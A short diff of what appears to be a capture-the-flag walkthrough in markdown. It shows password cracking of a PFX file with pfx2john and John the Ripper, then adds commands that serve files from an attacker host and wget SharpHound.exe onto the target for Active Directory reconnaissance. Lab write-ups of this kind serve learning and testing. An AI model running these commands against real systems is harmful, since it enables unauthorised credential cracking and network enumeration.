@@ -97,4 +97,12 @@ pfx2john staff.pfx > pfx_hash
 john pfx_hash -w=/usr/share/wordlists/rockyou.txt
 ```
 ![image](https://user-images.githubusercontent.com/33616880/230701880-f44b38ab-db4a-45e3-9544-d36bb638e82f.png)
+![image](https://user-images.githubusercontent.com/33616880/230701923-cfcd0109-1539-44e5-94e6-5200460228e7.png)
 
+
+![image](https://user-images.githubusercontent.com/33616880/230702031-e7010f86-fe69-4c70-897d-f3312121b1b4.png)
+```
+python3 -m http.server 80
+wget 10.10.14.4/SharpHound.exe -o SharpHound.exe
+```
+![image](https://user-images.githubusercontent.com/33616880/230702230-01468743-51b4-4de4-8cc5-d551ec9d23b7.png)
